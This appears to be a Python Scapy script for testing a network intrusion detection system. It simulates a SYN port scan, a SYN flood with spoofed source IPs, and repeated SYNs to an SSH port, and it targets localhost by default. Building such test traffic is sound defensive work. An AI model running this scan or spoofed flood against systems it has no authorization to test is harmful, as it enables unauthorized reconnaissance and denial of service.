#!/usr/bin/env python3
"""
Attack Simulation Script
Generates packets to test the Network IDS.
Must be run with administrative/root privileges to send packets.
(e.g., sudo python simulated_attack.py ...)
"""

# Fix Scapy cache directory issue before importing
import os
import tempfile
try:
    # Create a writable cache directory in temp
    temp_cache = os.path.join(tempfile.gettempdir(), 'scapy_cache')
    os.makedirs(temp_cache, mode=0o755, exist_ok=True)
    os.environ['SCAPY_CACHE_DIR'] = temp_cache
except Exception:
    pass

import argparse
import random
import time
import sys
from scapy.all import send, IP, TCP, Raw
from scapy.volatile import RandShort

def check_privileges():
    """Check for administrative/root privileges."""
    if os.name == 'nt': # Windows
        try:
            import ctypes
            if not ctypes.windll.shell32.IsUserAnAdmin():
                print("Warning: Not running as Administrator. Packet sending may fail.", file=sys.stderr)
        except ImportError:
            print("Warning: Could not check admin status. Packet sending may fail.", file=sys.stderr)
    else: # Linux/macOS
        if os.geteuid() != 0:
            print("Warning: Not running as root. Packet sending may fail.", file=sys.stderr)
            print("         Please run this script with 'sudo'.", file=sys.stderr)

def port_scan(target_ip, num_ports):
    """
    Simulates a port scan by sending SYN packets to multiple random ports.
    This should trigger your 'PORT_SCAN', 'HEAVY_PORT_SCAN', and 'MASSIVE_PORT_SCAN' rules.
    """
    print(f"[+] Starting Port Scan on {target_ip} (scanning {num_ports} ports)...")
    
    # Generate a list of random ports to scan
    # Use a set to ensure they are unique, matching the IDS logic
    ports_to_scan = set()
    while len(ports_to_scan) < num_ports:
        ports_to_scan.add(random.randint(1024, 49151))

    for dport in ports_to_scan:
        try:
            # Send a single SYN packet
            packet = IP(dst=target_ip) / TCP(sport=RandShort(), dport=dport, flags="S")
            send(packet, verbose=0)
            time.sleep(0.01) # Small delay
        except Exception as e:
            print(f"Error sending packet: {e}")

    print(f"[+] Port Scan complete. Sent {num_ports} SYN packets.")

def syn_flood(target_ip, target_port, num_packets):
    """
    Simulates a SYN Flood (DoS) attack by sending many SYN packets from spoofed IPs.
    This should trigger your 'CONNECTION_FLOOD' rule.
    """
    print(f"[+] Starting SYN Flood on {target_ip}:{target_port} ({num_packets} packets)...")
    
    for i in range(num_packets):
        try:
            # Spoof the source IP to make it look like a real flood
            spoofed_ip = f"{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"
            
            packet = IP(src=spoofed_ip, dst=target_ip) / TCP(sport=RandShort(), dport=target_port, flags="S")
            
            # Send packet without verbose output
            send(packet, verbose=0)
        except Exception as e:
            print(f"Error sending packet: {e}")

    print(f"[+] SYN Flood complete. Sent {num_packets} packets.")

def brute_force(target_ip, target_port, num_attempts):
    """
    Simulates a Brute Force attack by sending repeated connection attempts (SYNs)
    to a single authentication port (e.g., SSH, RDP).
    This should trigger your 'BRUTE_FORCE' rule.
    """
    print(f"[+] Starting Brute Force simulation on {target_ip}:{target_port} ({num_attempts} attempts)...")
    
    for i in range(num_attempts):
        try:
            # Send a SYN packet to simulate a login attempt
            packet = IP(dst=target_ip) / TCP(sport=RandShort(), dport=target_port, flags="S")
            send(packet, verbose=0)
            time.sleep(random.uniform(0.5, 2.0)) # Wait a bit between attempts
        except Exception as e:
            print(f"Error sending packet: {e}")

    print(f"[+] Brute Force simulation complete. Sent {num_attempts} attempts.")

def main():
    parser = argparse.ArgumentParser(
        description="Network Attack Simulation Tool for testing IDS",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Run a heavy port scan (150 ports) against localhost
  sudo python simulated_attack.py --attack scan --count 150

  # Run a massive port scan (1100 ports) to trigger the ML-style alert
  sudo python simulated_attack.py --attack scan --count 1100

  # Run a SYN flood against port 80 on a specific IP
  sudo python simulated_attack.py --attack flood --target 192.168.1.102 --port 80

  # Run a brute force simulation against the SSH port on localhost
  sudo python simulated_attack.py --attack brute --port 22
"""
    )
    
    parser.add_argument(
        '--attack',
        choices=['scan', 'flood', 'brute'],
        required=True,
        help="The type of attack to simulate."
    )
    parser.add_argument(
        '--target',
        default='127.0.0.1',
        help="The target IP address (default: 127.0.0.1)"
    )
    parser.add_argument(
        '--port',
        type=int,
        help="The target port (for 'flood' and 'brute' attacks). Default: 80 for flood, 22 for brute."
    )
    parser.add_argument(
        '--count',
        type=int,
        help="Number of packets/attempts. Default: 150 for scan, 200 for flood, 10 for brute."
    )
    
    args = parser.parse_args()
    
    check_privileges()
    
    target_ip = args.target
    
    if args.attack == 'scan':
        num_ports = args.count if args.count else 150 # Default to 150 to hit "heavy"
        port_scan(target_ip, num_ports)
        
    elif args.attack == 'flood':
        target_port = args.port if args.port else 80 # Default to port 80
        num_packets = args.count if args.count else 200
        syn_flood(target_ip, target_port, num_packets)
        
    elif args.attack == 'brute':
        target_port = args.port if args.port else 22 # Default to port 22 (SSH)
        num_attempts = args.count if args.count else 10
        brute_force(target_ip, target_port, num_attempts)

if __name__ == "__main__":
    main()